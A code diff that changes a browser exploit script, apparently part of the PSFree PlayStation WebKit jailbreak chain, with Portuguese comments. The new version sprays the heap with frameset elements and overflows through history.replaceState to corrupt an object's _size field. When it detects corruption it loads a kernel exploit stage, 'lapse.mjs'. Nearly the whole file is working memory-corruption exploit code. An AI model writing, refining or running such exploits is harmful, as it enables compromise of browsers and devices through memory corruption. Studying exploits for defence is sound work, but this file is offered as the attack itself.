@@ -1,142 +1,127 @@
-/* PSFree Modular: Smart Header Strike (Calculated Offset) */
+/* PSFree Modular: Frameset OOM Detector
+   Target: 1MB Contiguous Object (_size + _data)
+*/
 
-import { Int } from './module/int64.mjs';
 import { log, sleep } from './module/utils.mjs';
 
-// --- CÁLCULO BASEADO NA ANÁLISE DO PSFREE ---
-// Se acertamos dados em 709520, e o header inline do WebKit tem dados em +20 e length em +4...
-// A diferença é 16 bytes.
-const DATA_HIT_OFFSET = 709520;
-const TARGET_HEADER_OFFSET = DATA_HIT_OFFSET - 16; // 709504
-
-// Overflow suficiente para cobrir o objeto
+// Configuração do Exploit
+const BASE_OFFSET = 709520; 
 const OVERFLOW_AMT = 1024 * 64; 
 
-// Tamanho Vencedor (1MB TextDecoder)
-const TARGET_SIZE = 1024 * 1024; 
-const PAYLOAD_SIZE = TARGET_SIZE - 24; 
+// Configuração da Vítima (1MB)
+// Total 1MB - 8 bytes header = Dados
+const TARGET_BYTES = 1024 * 1024;
+const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
+const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);
 
 var victims = [];
 
 async function main() {
-    log("=== PSFree: Smart Header Strike ===");
-    log(`Analise: Dados em ${DATA_HIT_OFFSET}. Tentando Length em ${TARGET_HEADER_OFFSET}...`);
-    
-    // Vamos tentar uma janela pequena ao redor do alvo calculado (709504)
-    // Testamos: 709504, 709505, 709506, 709507... até 709512
-    // Usamos precisão de 1 byte para não errar o alinhamento de 32-bit do Length
-    
-    let start = TARGET_HEADER_OFFSET;
-    let end = TARGET_HEADER_OFFSET + 8;
+    log("=== PSFree: Frameset OOM Detector ===");
+    log("Estratégia: Corromper '_size' e detectar Erro de Memória.");
 
-    for (let off = start; off <= end; off++) {
+    // 1. WARMUP (Do arquivo psfree.mjs)
+    // Prepara o alocador para receber objetos grandes
+    log("[1] Aquecendo alocador...");
+    let dummy = "W".repeat(BASE_OFFSET);
+    history.replaceState(dummy, "warmup", null);
+    await sleep(100);
+
+    // Tenta alinhamentos finos de ponte (0, 8, 16 bytes)
+    // Para garantir que o 0x01 caia EXATAMENTE no _size
+    for (let bridge = 0; bridge <= 16; bridge += 8) {
+        log(`\n[TESTE] Ponte de Zeros: ${bridge} bytes`);
         
-        log(`\n[TESTE] Offset ${off}`);
-
-        // Tenta 2 vezes por offset para estabilidade
-        for(let retry=0; retry<2; retry++) {
-            
-            await prepare_heap();
-            let result = await trigger_exploit(off);
-
-            if (result === 'RCE') {
-                log("!!! VENCEU !!! LENGTH CORROMPIDO!", 'green');
-                log("Carregando Kernel Exploit...", 'green');
-                await activate_stage2();
-                return;
-            }
-            
-            if (result === 'DATA') {
-                log(`[INFO] Offset ${off} ainda pega DADOS.`, 'yellow');
-                // Se ainda pega dados aqui, o header pode estar AINDA mais pra trás.
-                // Mas vamos deixar o loop terminar.
-            }
-            
-            victims = [];
-            await forceGC();
+        await prepare_heap();
+        
+        // Dispara
+        let success = await trigger_exploit(bridge);
+        
+        if (success) {
+            log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
+            log("O sistema tentou alocar memória infinita. Temos controle.", 'green');
+            // Aqui carregaríamos o Lapse
+            await import('./lapse.mjs');
+            return;
         }
+        
+        // Limpa
+        victims = [];
+        await forceGC();
     }
     
-    log("Fim do teste calculado.", 'red');
+    log("Falha. Tente reiniciar.", 'red');
 }
 
 async function prepare_heap() {
-    // 1. Criar Buffer 1MB
-    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
-    rawBuffer.fill(0x42); 
-    let decoder = new TextDecoder("utf-8");
-    let baseString = decoder.decode(rawBuffer);
-
     victims = [];
-    const SPRAY_COUNT = 80;
+    const SPRAY_COUNT = 60;
 
-    // 2. Spray
+    // SPRAY FRAMESET
     for(let i=0; i<SPRAY_COUNT; i++) {
-        let s = i + "_" + baseString.substring((i+"_").length);
-        victims.push(s);
+        let fset = document.createElement('frameset');
+        fset.rows = ROWS_STRING;
+        victims.push(fset);
     }
 
-    // 3. Buracos
-    for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
-    
+    // BURACOS
+    for(let i=0; i<SPRAY_COUNT; i+=2) {
+        victims[i].rows = ""; 
+        victims[i] = null;
+    }
     await forceGC();
 }
 
-async function trigger_exploit(offset) {
+async function trigger_exploit(bridgeSize) {
     try {
-        let buffer = "A".repeat(offset);
+        let buffer = "A".repeat(BASE_OFFSET);
         
-        // TENTATIVA DE BYPASS DE HEADER:
-        // Escrevemos 4 bytes de ZEROS (para pular Flags/RefCount no offset 0-3)
-        // Depois mandamos 0x01 (para acertar Length no offset 4)
-        buffer += "\u0000\u0000\u0000\u0000"; 
+        // A Ponte: Zeros para alinhar ou pular padding
+        buffer += "\u0000".repeat(bridgeSize);
         
+        // O Ataque: 0x01 no _size
         buffer += "\x01".repeat(OVERFLOW_AMT);
         
         history.replaceState({}, "pwn", "/" + buffer);
 
-        return check_corruption();
+        return check_victims();
 
     } catch(e) {
-        return 'ERR';
+        log("Erro no Trigger: " + e.message);
+        return false;
     }
 }
 
-function check_corruption() {
+function check_victims() {
     for(let i=1; i<victims.length; i+=2) {
-        let s = victims[i];
-        if(!s) continue;
+        let fset = victims[i];
+        if(!fset) continue;
+
         try {
-            let err = new Error(s);
-            let msg = err.message;
-
-            // SUCESSO (LENGTH)
-            if (msg.length !== PAYLOAD_SIZE) {
-                log(`!!! JACKPOT !!! String ${i} Length: ${msg.length}`, 'green');
-                return 'RCE';
+            // Tenta ler a propriedade.
+            // Se _size for normal, lê rápido.
+            // Se _size for 0x0101... (Gigante), vai tentar alocar string gigante.
+            let s = fset.rows;
+            
+            // Se leu e o tamanho está errado (mas coube na memória)
+            if (s.length !== ROWS_STRING.length) {
+                log(`[JACKPOT] Tamanho alterado: ${s.length}`, 'green');
+                return true;
             }
 
-            // DADOS
-            if (msg.charCodeAt(0) !== 66) {
-                return 'DATA';
-            }
-        } catch(e) {}
+        } catch(e) {
+            // AQUI É A VITÓRIA REAL
+            // Se der erro "Out of Memory" ou "String too long"
+            log(`[JACKPOT] Erro ao ler Frameset ${i}: ${e.message}`, 'green');
+            return true;
+        }
     }
-    return null;
-}
-
-async function activate_stage2() {
-    // Importa o Lapse para finalizar
-    try {
-        await import('./lapse.mjs');
-    } catch(e) {
-        log("Erro ao carregar Lapse: " + e.message);
-    }
+    return false;
 }
 
 async function forceGC() {
     try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-    return new Promise(r => setTimeout(r, 400));
+    return new Promise(r => setTimeout(r, 500));
 }
 
 main();
